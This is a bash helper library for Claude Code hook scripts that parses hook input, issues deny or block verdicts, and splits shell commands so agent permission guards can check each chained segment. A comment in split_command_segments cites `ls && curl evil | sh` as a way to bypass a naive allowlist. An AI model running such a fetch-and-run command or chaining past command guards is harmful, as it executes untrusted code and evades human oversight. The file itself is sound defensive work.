#!/bin/bash
# hooks-lib.sh — shared helper library for Claude Code hook scripts.
#
# Sourcing convention:
#   source "$(dirname "$0")/lib/hooks-lib.sh"
#
# What this library provides:
#   parse_input                  — read stdin once, populate exported vars (see contract below)
#   deny "<reason>"              — emit a PreToolUse permissionDecision: "deny" JSON envelope
#                                  to stdout. Caller should `exit 0` after.
#   block "<reason>"             — emit a Stop-event {"decision":"block","reason":...} JSON
#                                  envelope to stdout. Caller should `exit 0` after.
#   debug_log <slug> ...         — append a timestamped line to /tmp/<slug>-debug.log when
#                                  CODEGEN_HOOKS_DEBUG or per-slug overrides are set
#   hooks_realpath <path>        — pure-bash equivalent of `python3 os.path.realpath`,
#                                  handling non-existent paths via parent-walk fallback
#   session_log_from_transcript  — return the last codegen/logging/*.jsonl path written by
#                                  this session, from $TRANSCRIPT_PATH. Empty if none.
#   pitch_from_transcript        — return the last codegen/pitches/*.md path written by
#                                  this session, from $TRANSCRIPT_PATH. Empty if none.
#                                  Exact mirror of session_log_from_transcript but matches
#                                  the codegen/pitches/.*\.md$ pattern.
#   read_tool_failures <dir>     — pretty-print durable tool-failure store under
#                                  <dir>/codegen/logging/failures/*.jsonl. Groups by tool.
#   read_gate_verdicts <dir>     — pretty-print durable gate-verdict history at
#                                  <dir>/codegen/logging/gate-verdicts.jsonl. Groups by verdict.
#   guard_breadcrumb <sid> <line> — best-effort JSONL append to
#                                  codegen/logging/.guard-diagnostics/<sid>.jsonl.
#                                  Instrumentation only — NEVER alters caller verdict.
#
# Input contract (PreToolUse + SubagentStop + Stop fields, parse_input fills any
# field present on stdin and leaves the rest empty):
#   RAW_INPUT              — raw stdin string (preserve for ad-hoc jq queries)
#   TOOL_NAME              — .tool_name  (PreToolUse)
#   AGENT_TYPE             — .agent_type (PreToolUse / SubagentStart / SubagentStop)
#   AGENT_ID               — .agent_id   (PreToolUse / SubagentStop)
#   COMMAND                — .tool_input.command (Bash)
#   FILE_PATH              — .tool_input.file_path // .tool_input.notebook_path // .tool_input.path
#   CWD                    — .cwd        (PreToolUse / SubagentStop / Stop)
#   SESSION_ID             — .session_id (Stop / SubagentStop)
#   STOP_HOOK_ACTIVE       — .stop_hook_active // false
#   LAST_ASSISTANT_MESSAGE — .last_assistant_message
#   TRANSCRIPT_PATH        — .transcript_path
#   PROMPT                 — .prompt (UserPromptSubmit / SubagentStart)
#
# All exported vars default to "" if absent on stdin. Callers should still
# treat any field as possibly empty — for example, AGENT_TYPE is "" for
# orchestrator-level PreToolUse calls.

set -u

# SESSION_LOG_NAME_RE — canonical cycle-log filename-class regex (basename
# match, no leading path segment). Single source of truth for the slug-class
# shape: YYYYMMDD_HHMMSS_<slug>_cycle.jsonl (append-only JSONL storage — the
# old markdown "_session.md" / "_stepN_<slug>.md" forms are gone; the latter
# was never written by codegen-log and is not ported).
# Consumers that need the "codegen/logging/" prefix concatenate it themselves
# (reviewer-guard.sh, committer-write-allowlist.sh both do `codegen/logging/${SESSION_LOG_NAME_RE}`).
# Kept in lockstep (parity-tested, not shared via a single runtime include —
# bash guards cannot `source` a fragment mid-grep-pattern) with:
#   - harnesses/pi/pi-extensions/enforcement/src/hooks/committer-write-allowlist.ts (CANONICAL_LOG_RE)
#   - shared/enforcement/registry.yaml (2 `match:` lines)
#   - shared/rules/_core/session-log.md § File Naming (authoritative prose)
# Any edit to the slug-class shape MUST update all 6 sites in the same change;
# see codegen-log_test.sh / hooks-lib_test.sh for the cross-site parity assertion.
SESSION_LOG_NAME_RE='[0-9]{8}_[0-9]{6}_[a-z0-9_-]+_cycle\.jsonl$'

# parse_input — populate exported vars from JSON-on-stdin.
# Reads stdin once into RAW_INPUT, then runs a single jq invocation that
# emits each field on its own line in a fixed order. We re-read stdin via
# RAW_INPUT to avoid a second jq call per field.
parse_input() {
    RAW_INPUT=$(cat)
    export RAW_INPUT

    # fail-loud: non-JSON stdin is an anomaly (Claude Code always sends JSON
    # for these events); hard-fail rather than silently produce all-empty
    # vars that let a hook fall through its normal-looking-but-wrong logic.
    # Guarded on non-empty RAW_INPUT: some hooks are invoked with no stdin at
    # all (a legitimate, tolerated shape), so an empty read must NOT trip
    # this assert.
    if [ -n "$RAW_INPUT" ] && ! printf '%s' "$RAW_INPUT" | jq -e . >/dev/null 2>&1; then
        echo "parse_input: stdin is not valid JSON" >&2
        exit 2
    fi

    # Single jq invocation that prints each field on a line. Use @sh to
    # protect newlines and special chars; we then read line by line.
    # NOTE: we rely on `jq -r` — fields containing literal newlines will
    # break this scheme. Hook inputs from Claude Code do not contain
    # multi-line tool_input.command values often enough to justify the
    # extra cost of @json + jq per field; revisit if a hook breaks.
    # Per-field jq calls — slightly more expensive than a single multi-output
    # call, but preserves embedded newlines in fields like PROMPT,
    # LAST_ASSISTANT_MESSAGE, and tool_input.command (heredocs).
    # The `// ""` / `// false` fallbacks are legitimate optional-field
    # defaults (a field absent on a given event type, e.g. COMMAND on a
    # Write event) — NOT error-swallowing. The jq-validity assert above
    # already guarantees RAW_INPUT is well-formed JSON by this point, so a
    # per-field `2>/dev/null` here would only mask a genuine jq bug.
    TOOL_NAME=$(printf '%s' "$RAW_INPUT" | jq -r '.tool_name // ""')
    AGENT_TYPE=$(printf '%s' "$RAW_INPUT" | jq -r '.agent_type // ""')
    AGENT_ID=$(printf '%s' "$RAW_INPUT" | jq -r '.agent_id // ""')
    COMMAND=$(printf '%s' "$RAW_INPUT" | jq -r '.tool_input.command // ""')
    FILE_PATH=$(printf '%s' "$RAW_INPUT" | jq -r '.tool_input.file_path // .tool_input.notebook_path // .tool_input.path // ""')
    CWD=$(printf '%s' "$RAW_INPUT" | jq -r '.cwd // ""')
    SESSION_ID=$(printf '%s' "$RAW_INPUT" | jq -r '.session_id // ""')
    STOP_HOOK_ACTIVE=$(printf '%s' "$RAW_INPUT" | jq -r '.stop_hook_active // false | tostring')
    LAST_ASSISTANT_MESSAGE=$(printf '%s' "$RAW_INPUT" | jq -r '.last_assistant_message // ""')
    TRANSCRIPT_PATH=$(printf '%s' "$RAW_INPUT" | jq -r '.transcript_path // ""')
    PROMPT=$(printf '%s' "$RAW_INPUT" | jq -r '.prompt // ""')

    export TOOL_NAME AGENT_TYPE AGENT_ID COMMAND FILE_PATH CWD \
        SESSION_ID STOP_HOOK_ACTIVE LAST_ASSISTANT_MESSAGE TRANSCRIPT_PATH PROMPT
}

# deny <reason> — emit PreToolUse permissionDecision:"deny" JSON envelope.
# The caller should `exit 0` after invoking this; Claude Code reads the JSON
# from stdout to determine the deny action. Reason is surfaced to the model
# via permissionDecisionReason.
deny() {
    local reason="$1"
    jq -n --arg reason "$reason" '{
        hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
        }
    }'
}

# block <reason> — emit Stop-event {"decision":"block","reason":...} JSON.
# Used by interactive-session-fallback Stop hooks to inject a synthetic
# user turn after the main-agent session stops. Caller should `exit 0`.
block() {
    local reason="$1"
    jq -n --arg reason "$reason" '{decision: "block", reason: $reason}'
}

# debug_log <slug> <fields...> — append a timestamped debug line.
# Active when CODEGEN_HOOKS_DEBUG is set OR when CODEGEN_<SLUG>_DEBUG
# is set (slug uppercased, hyphens → underscores). Output goes to
# /tmp/<slug>-debug.log. Errors are silently ignored — this is a diagnostic.
debug_log() {
    local slug="$1"
    shift
    local upper
    upper=$(printf '%s' "$slug" | tr 'a-z-' 'A-Z_')
    local per_slug_var="CODEGEN_${upper}_DEBUG"
    if [ -z "${CODEGEN_HOOKS_DEBUG:-}" ] && [ -z "${!per_slug_var:-}" ]; then
        return 0
    fi
    printf '%s %s %s\n' \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
        "$slug" \
        "$*" \
        >>"/tmp/${slug}-debug.log" 2>/dev/null || true
}

# hooks_realpath <path> — resolve to an absolute, symlink-free path.
# Pure bash + cd/pwd -P trick. For non-existent paths, walks up parents
# until an existing directory is found, then re-appends the unresolved
# tail. Equivalent to `python3 -c "import os; print(os.path.realpath(p))"`
# for the cases this codebase exercises.
hooks_realpath() {
    local p="$1"
    [ -z "$p" ] && {
        printf ''
        return 0
    }

    # If the path already exists, the cd-basename trick is enough.
    if [ -e "$p" ]; then
        if [ -d "$p" ]; then
            (cd "$p" 2>/dev/null && pwd -P)
            return $?
        fi
        local dir base
        dir=$(dirname "$p")
        base=$(basename "$p")
        local resolved_dir
        resolved_dir=$(cd "$dir" 2>/dev/null && pwd -P)
        if [ -z "$resolved_dir" ]; then
            printf '%s' "$p"
            return 0
        fi
        # If it's a symlink to a file, resolve the target.
        if [ -L "$p" ]; then
            local target
            target=$(readlink "$p")
            case "$target" in
            /*)
                hooks_realpath "$target"
                return
                ;;
            *)
                hooks_realpath "$resolved_dir/$target"
                return
                ;;
            esac
        fi
        printf '%s/%s' "$resolved_dir" "$base"
        return 0
    fi

    # Non-existent path: walk up parents until one exists, then re-append
    # the tail.
    local tail=""
    local cur="$p"
    # Make absolute first so dirname behaves predictably.
    case "$cur" in
    /*) ;;
    *) cur="$PWD/$cur" ;;
    esac

    while [ -n "$cur" ] && [ ! -e "$cur" ]; do
        local base
        base=$(basename "$cur")
        if [ -z "$tail" ]; then
            tail="$base"
        else
            tail="$base/$tail"
        fi
        local parent
        parent=$(dirname "$cur")
        if [ "$parent" = "$cur" ]; then
            # Reached / and still nothing exists — return as-is.
            printf '%s' "$p"
            return 0
        fi
        cur="$parent"
    done

    local resolved_existing
    if [ -d "$cur" ]; then
        resolved_existing=$(cd "$cur" 2>/dev/null && pwd -P)
    else
        resolved_existing=$(hooks_realpath "$cur")
    fi

    if [ -z "$resolved_existing" ]; then
        printf '%s' "$p"
        return 0
    fi

    if [ -z "$tail" ]; then
        printf '%s' "$resolved_existing"
    elif [ "$resolved_existing" = "/" ]; then
        printf '/%s' "$tail"
    else
        printf '%s/%s' "$resolved_existing" "$tail"
    fi
}

# repo_relative — convert a path to a repo-relative form.
#
# Given an absolute or relative path, returns the path relative to the repo root.
# The root is resolved as the git toplevel of the file's own containing directory
# (cwd-independent, via `git -C`). When git is unavailable or the path is not
# inside a git repo, falls back to stripping the launch cwd
# (CWD / CLAUDE_PROJECT_DIR / $PWD). If neither prefix matches, the canonicalised
# path is returned as-is (absolute).
#
# Usage: rel=$(repo_relative "$FILE_PATH")
repo_relative() {
    local path="$1"
    # Relative paths are already repo-relative — pass through unchanged.
    case "$path" in
    /*) ;;
    *)
        printf '%s\n' "$path"
        return 0
        ;;
    esac
    local canonical
    canonical=$(hooks_realpath "$path") || return 1

    # Prefer the git toplevel of the file's own directory — cwd-independent.
    # Walk up to the first EXISTING ancestor (the file itself may not exist yet
    # on a fresh Write), then ask git from there with -C.
    local probe_dir
    probe_dir=$(dirname "$canonical")
    while [ -n "$probe_dir" ] && [ ! -d "$probe_dir" ]; do
        local parent
        parent=$(dirname "$probe_dir")
        [ "$parent" = "$probe_dir" ] && break
        probe_dir="$parent"
    done
    if [ -d "$probe_dir" ]; then
        local toplevel
        toplevel=$(git -C "$probe_dir" rev-parse --show-toplevel 2>/dev/null) || toplevel=""
        if [ -n "$toplevel" ]; then
            toplevel=$(hooks_realpath "$toplevel") || toplevel=""
        fi
        if [ -n "$toplevel" ]; then
            case "$toplevel" in
            */) ;;
            *) toplevel="${toplevel}/" ;;
            esac
            case "$canonical" in
            "${toplevel}"*)
                printf '%s\n' "${canonical#"$toplevel"}"
                return 0
                ;;
            esac
        fi
    fi

    # Fallback: strip the launch cwd (preserves every case that works today).
    local raw_cwd="${CWD:-${CLAUDE_PROJECT_DIR:-$PWD}}"
    local cwd_prefix
    cwd_prefix=$(hooks_realpath "$raw_cwd") || cwd_prefix="$raw_cwd"
    case "$cwd_prefix" in
    */) ;;
    *) cwd_prefix="${cwd_prefix}/" ;;
    esac
    case "$canonical" in
    "${cwd_prefix}"*) printf '%s\n' "${canonical#"$cwd_prefix"}" ;;
    *) printf '%s\n' "$canonical" ;;
    esac
}

# session_log_from_transcript — return the last codegen/logging/*.jsonl path
# written by this session, derived from $TRANSCRIPT_PATH (set by parse_input).
#
# Resolution order:
#   0. $CODEGEN_LOG_PATH env var, IFF set and the path exists on disk. This is
#      the loop's own pin for the cycle's log (see session-log.md § Resolution
#      precedence) — every role invocation carries it. Binding to the pin
#      FIRST, ahead of the sentinel, is what stops a same-process init with a
#      mistyped/rival slug from hijacking .active out from under a guard that
#      is grading THIS cycle's log. A dangling pin (unset or pointing at a
#      path that no longer exists) falls through to step 1, never wedges.
#   1. codegen/logging/.active sentinel under $cwd, IFF it points at a path
#      that still exists on disk. Synchronous disk read, flush-independent —
#      does not depend on the transcript having caught up with a live write.
#      Written by codegen-log init/relocate.
#   2. The transcript-based scan below (belt-and-suspenders — kept as a
#      fallback for cwds/fixtures that never ran codegen-log init, or a
#      stale/relocated sentinel).
#
# Transcript scan: reads TRANSCRIPT_PATH as a JSONL file (one JSON object per
# line). Filters assistant tool_use entries with name in {Write, Edit,
# MultiEdit} whose input.file_path matches the pattern codegen/logging/.*\.jsonl$.
# Outputs the LAST matching file_path (tail -n 1 semantics — most recent write
# in transcript order). Empty result when:
#   - TRANSCRIPT_PATH is unset or empty
#   - TRANSCRIPT_PATH does not exist or is not readable
#   - No matching tool_use entries found
# jq errors are swallowed via 2>/dev/null. No --slurp (streams line-by-line).
#
# codegen-log is the SOLE legitimate writer of cycle logs (see
# session-log-writer-only.sh) — raw Write/Edit/MultiEdit on
# codegen/logging/*.jsonl are hard-denied. When the Write/Edit/MultiEdit scan
# above finds nothing, this fn also scans for a Bash tool_use whose
# .input.command invokes a codegen-log writer subcommand
# (init|section|append). That is treated as equivalent creation evidence,
# and — UNCONDITIONALLY, not gated on OCG_APPS_ROOT — falls through to a disk
# mtime-scan of codegen/logging/*.jsonl under $cwd (same heuristic the Pi TS
# twins already use). This closes the deadlock where a session's transcript
# never contains a Write/Edit/MultiEdit event for the log (because
# codegen-log is a Bash invocation), so the strict scan always returns empty.
session_log_from_transcript() {
    local result=""
    local codegen_log_evidence=""
    if [ -n "${CODEGEN_LOG_PATH:-}" ] && [ -e "$CODEGEN_LOG_PATH" ]; then
        printf '%s' "$CODEGEN_LOG_PATH"
        return
    fi
    local active_sentinel="${CWD:-$PWD}/codegen/logging/.active"
    if [ -f "$active_sentinel" ]; then
        local sentinel_path
        sentinel_path=$(cat "$active_sentinel" 2>/dev/null || true)
        if [ -n "$sentinel_path" ] && [ -e "$sentinel_path" ]; then
            printf '%s' "$sentinel_path"
            return
        fi
    fi
    # Run the transcript jq scan only when TRANSCRIPT_PATH is usable. When it is
    # empty/unset/unreadable, skip the scan but FALL THROUGH to the disk fallback
    # below (managed builds with a lagging or absent transcript still resolve).
    if [ -n "${TRANSCRIPT_PATH:-}" ] && [ -r "$TRANSCRIPT_PATH" ]; then
        result=$(jq -r '
        .message.content[]?
        | select(.type == "tool_use"
            and (.name == "Write" or .name == "Edit" or .name == "MultiEdit"))
        | select(.input.file_path | test("codegen/logging/.*\\.jsonl$"))
        | .input.file_path
    ' "$TRANSCRIPT_PATH" 2>/dev/null | tail -n 1)
        if [ -z "$result" ]; then
            codegen_log_evidence=$(jq -r '
            .message.content[]?
            | select(.type == "tool_use" and .name == "Bash")
            | select(.input.command | test("codegen-log[[:space:]]+(init|section|append)"))
            | "1"
        ' "$TRANSCRIPT_PATH" 2>/dev/null | tail -n 1)
        fi
    fi
    # codegen-log-writer evidence found but no Write/Edit/MultiEdit path resolved:
    # resolve via disk mtime-scan unconditionally (not gated on managed-build env).
    if [ -z "$result" ] && [ -n "$codegen_log_evidence" ]; then
        local cwd="${CWD:-$PWD}"
        result=$(ls -t "$cwd/codegen/logging"/*.jsonl 2>/dev/null | head -1)
    fi
    # Filesystem fallback for managed build sessions where the transcript file
    # lags the live stream (print-mode builds flush the transcript asynchronously).
    # Also fires when the transcript yields a path that no longer exists on disk
    # (stale/lagging transcript pointing at an old log). In both cases, consult
    # the disk under managed-build conditions.
    # Interactive sessions keep strict transcript-bound resolution — if neither
    # inner branch assigns, result stays empty/stale → caller denies.
    if [ -z "$result" ] || [ ! -e "$result" ]; then
        # A stale (non-existent) transcript path must not block the disk scan.
        [ -n "$result" ] && [ ! -e "$result" ] && result=""
        local apps_root="${OCG_APPS_ROOT:-}"
        local cwd="${CWD:-$PWD}"
        if [ -n "$apps_root" ]; then
            case "$cwd" in
            "${apps_root%/}"/*)
                result=$(ls -t "$cwd/codegen/logging"/*.jsonl 2>/dev/null | head -1)
                ;;
            esac
        fi
    fi
    printf '%s' "$result"
}

# pitch_from_transcript — return the last codegen/pitches/*.md path written
# by this session, derived from $TRANSCRIPT_PATH (set by parse_input).
#
# Exact mirror of session_log_from_transcript but matches the pattern
# codegen/pitches/.*\.md$ instead of codegen/logging/.*\.md$. Returns
# the LAST matching file_path (tail -n 1 semantics — most recent write in
# transcript order). Empty result when:
#   - TRANSCRIPT_PATH is unset or empty
#   - TRANSCRIPT_PATH does not exist or is not readable
#   - No matching tool_use entries found
# jq errors are swallowed via 2>/dev/null. No --slurp (streams line-by-line).
pitch_from_transcript() {
    if [ -z "${TRANSCRIPT_PATH:-}" ] || [ ! -r "$TRANSCRIPT_PATH" ]; then
        printf ''
        return 0
    fi
    jq -r '
        .message.content[]?
        | select(.type == "tool_use"
            and (.name == "Write" or .name == "Edit" or .name == "MultiEdit"))
        | select(.input.file_path | test("codegen/pitches/.*\\.md$"))
        | .input.file_path
    ' "$TRANSCRIPT_PATH" 2>/dev/null | tail -n 1
}

# is_subagent — true if AGENT_TYPE is set (inner subagent invocation).
# Used to gate outer-session-only constraints that must NOT apply to subagents.
is_subagent() {
    [ -n "${AGENT_TYPE:-}" ]
}

# is_outer_session — true if AGENT_TYPE is unset (orchestrator-level call).
# Inverse of is_subagent; explicit name for readability.
is_outer_session() {
    [ -z "${AGENT_TYPE:-}" ]
}

# is_codegen_log_write — true when $COMMAND invokes the codegen-log CLI (the
# SOLE legitimate session-log writer). A codegen-log heredoc body can
# legitimately contain any gated phrase; command-scanning guards must treat
# such a call as a log WRITE, never the gated action it narrates. Mirrors the
# bypass in session-log-writer-only.sh.
is_codegen_log_write() {
    printf '%s' "${COMMAND:-}" | grep -qE '(^|[[:space:]/])codegen-log\b'
}

# strip_quoted <command_string> — echoes $1 with single- and double-quoted
# spans removed. Fail-closed subject transform for command-scanning deny
# guards: a forbidden token INSIDE a quoted span (a remote-exec payload like
# ssh host "cat f | head", or a quoted string argument like grep -n 'git
# stash' file) is not a real local invocation of that token — matching the
# stripped residue means an unquoted (real, local) occurrence still matches
# and is still denied, while a quoted (remote/string) occurrence is removed
# and bypasses. Imperfect stripping (escaped/nested quotes) can only RETAIN
# a false positive, never introduce a false negative. Mirrors the
# is_codegen_log_write pre-match bypass precedent above.
strip_quoted() {
    printf '%s' "$1" | sed "s/'[^']*'//g; s/\"[^\"]*\"//g"
}

# strip_git_global_opts <command_string> — echoes $1 with git's global
# options removed from between the `git` token and its subcommand, so
# `git -C /tmp/x commit -m y` normalizes to `git commit -m y` before
# verb-matching. Closed, documented set (see `man git`, GLOBAL OPTIONS):
# -C <path>, -c <k=v>, --git-dir[=path], --work-tree[=path],
# --exec-path[=path], --namespace[=ns], --no-pager, --no-replace-objects,
# --literal-pathspecs, --bare, -p/--paginate, -P. Consumes ONLY tokens
# matching these known option shapes and STOPS at the first token that does
# not match one — that token is the subcommand (the verb) and is never
# consumed, so a real `git commit` is always preserved. Applies to every
# occurrence of a `git` token in the string (not just the first), so a
# chained command (`foo && git -C x commit`) is normalized throughout.
# Non-git input, or a bare `git <verb>` with no interposed options, passes
# through unchanged. Pure-bash token walk — no external interpreter dep.
strip_git_global_opts() {
    local cmd="$1"
    local -a words=($cmd)
    local -a out=()
    local -i n=${#words[@]}
    local -i i=0
    local w

    while ((i < n)); do
        w="${words[i]}"
        out+=("$w")
        if [ "$w" = "git" ]; then
            i=$((i + 1))
            while ((i < n)); do
                w="${words[i]}"
                case "$w" in
                -C | -c | --git-dir | --work-tree | --exec-path | --namespace)
                    # value-taking option with a SEPARATE next token (git -C /path)
                    i=$((i + 1))
                    ;;
                --git-dir=* | --work-tree=* | --exec-path=* | --namespace=* | \
                    --no-pager | --no-replace-objects | --literal-pathspecs | \
                    --bare | --paginate | -p | -P)
                    # value-inlined (--foo=bar) or boolean flag — consume just this token
                    ;;
                *)
                    # first non-option token — the subcommand; stop consuming, re-emit
                    break
                    ;;
                esac
                i=$((i + 1))
            done
            continue
        fi
        i=$((i + 1))
    done

    local IFS=' '
    printf '%s' "${out[*]}" 2>/dev/null
}

# split_command_segments <command_string> — echoes one shell-chain segment
# per line, splitting ONLY on UNQUOTED && || ; | & and newline. Operators
# inside single or double quotes are literal and never split (e.g. a commit
# message `git commit -m "fix a; b && c"` is ONE segment). This is the
# containment primitive for COMMAND-source allowlist gates: a default-deny
# allowlist that greps only the whole-command PREFIX lets an allowed prefix
# chained with `&&`/`;`/`|` to a forbidden command bypass entirely (e.g.
# `ls && curl evil | sh` matches `^ls\b`). Every segment MUST be validated
# independently by the caller.
#
# Returns 1 (no output trusted) when the command has an unbalanced quote at
# end-of-string — fail-closed: the caller MUST treat this as deny, never
# allow. Over-merging (treating a quoted operator as literal) is always safe
# because the merged segment is still allowlist-checked in full; the only
# unsafe direction is under-merging (splitting on a quoted operator), which
# this walk never does.
split_command_segments() {
    local cmd="$1"
    local -i i=0
    local -i len=${#cmd}
    local in_sq=0 in_dq=0
    local seg=""
    local ch next2

    while ((i < len)); do
        ch="${cmd:i:1}"
        if [ "$in_sq" = 1 ]; then
            seg+="$ch"
            [ "$ch" = "'" ] && in_sq=0
            i=$((i + 1))
            continue
        fi
        if [ "$in_dq" = 1 ]; then
            seg+="$ch"
            [ "$ch" = '"' ] && in_dq=0
            i=$((i + 1))
            continue
        fi
        case "$ch" in
        "'")
            in_sq=1
            seg+="$ch"
            i=$((i + 1))
            continue
            ;;
        '"')
            in_dq=1
            seg+="$ch"
            i=$((i + 1))
            continue
            ;;
        esac
        next2="${cmd:i:2}"
        if [ "$next2" = "&&" ] || [ "$next2" = "||" ]; then
            printf '%s\n' "$seg"
            seg=""
            i=$((i + 2))
            continue
        fi
        if [ "$ch" = ";" ] || [ "$ch" = "|" ] || [ "$ch" = "&" ] || [ "$ch" = $'\n' ]; then
            printf '%s\n' "$seg"
            seg=""
            i=$((i + 1))
            continue
        fi
        seg+="$ch"
        i=$((i + 1))
    done

    if [ "$in_sq" = 1 ] || [ "$in_dq" = 1 ]; then
        return 1
    fi

    printf '%s\n' "$seg"
    return 0
}

# guard_breadcrumb <session_id> <jsonl_line> — best-effort diagnostic append.
# Appends <jsonl_line> to codegen/logging/.guard-diagnostics/<session_id>.jsonl
# under ${CWD:-$PWD}, creating the directory if needed. This is a pure
# instrumentation aid for settling cycle-guard false-positive reports (flush-lag
# vs resolver-divergence vs compaction-orphan) — it MUST NEVER change the
# caller's verdict. Every step is best-effort (`2>/dev/null || true`) and the
# function ALWAYS returns 0, even when the sink directory cannot be created
# (e.g. a stray regular file occupies the intended directory path).
guard_breadcrumb() {
    local sid="${1:-unknown}"
    local line="${2:-}"
    local dir="${CWD:-$PWD}/codegen/logging/.guard-diagnostics"
    mkdir -p "$dir" 2>/dev/null || true
    printf '%s\n' "$line" >>"$dir/${sid}.jsonl" 2>/dev/null || true
    return 0
}

# read_tool_failures <project_dir> — pretty-print the durable tool-failure
# store under <project_dir>/codegen/logging/failures/*.jsonl.
# Aggregates tool × count with the latest error + session. Newest-first.
# Empty/absent store → prints "no tool failures recorded" and returns 0.
# Malformed JSONL lines are skipped (jq fromjson? // empty).
read_tool_failures() {
    local project_dir="$1"
    local dir="$project_dir/codegen/logging/failures"
    if ! ls "$dir"/*.jsonl >/dev/null 2>&1; then
        printf 'no tool failures recorded\n'
        return 0
    fi
    cat "$dir"/*.jsonl 2>/dev/null |
        jq -rR 'fromjson? // empty' 2>/dev/null |
        jq -rs '
            group_by(.tool)
            | map({tool: .[0].tool, count: length,
                   latest_error: (sort_by(.ts) | last | .error),
                   latest_ts: (map(.ts) | max)})
            | sort_by(.latest_ts) | reverse
            | (["TOOL","COUNT","LATEST_ERROR"] | @tsv),
              (.[] | [.tool, (.count|tostring),
                      (.latest_error | .[0:60])] | @tsv)
        ' 2>/dev/null
}

# read_gate_verdicts <project_dir> — pretty-print the durable gate-verdict
# history under <project_dir>/codegen/logging/gate-verdicts.jsonl.
# Aggregates verdict × count (clear/failed/inconclusive). Newest-first by ts.
# Empty/absent store → prints "no gate verdicts recorded" and returns 0.
read_gate_verdicts() {
    local project_dir="$1"
    local file="$project_dir/codegen/logging/gate-verdicts.jsonl"
    if [ ! -f "$file" ]; then
        printf 'no gate verdicts recorded\n'
        return 0
    fi
    jq -rR 'fromjson? // empty' "$file" 2>/dev/null |
        jq -rs '
            group_by(.verdict)
            | map({verdict: .[0].verdict, count: length,
                   latest_ts: (map(.ended) | max)})
            | sort_by(.latest_ts) | reverse
            | (["VERDICT","COUNT","LATEST"] | @tsv),
              (.[] | [.verdict, (.count|tostring), .latest_ts] | @tsv)
        ' 2>/dev/null
}
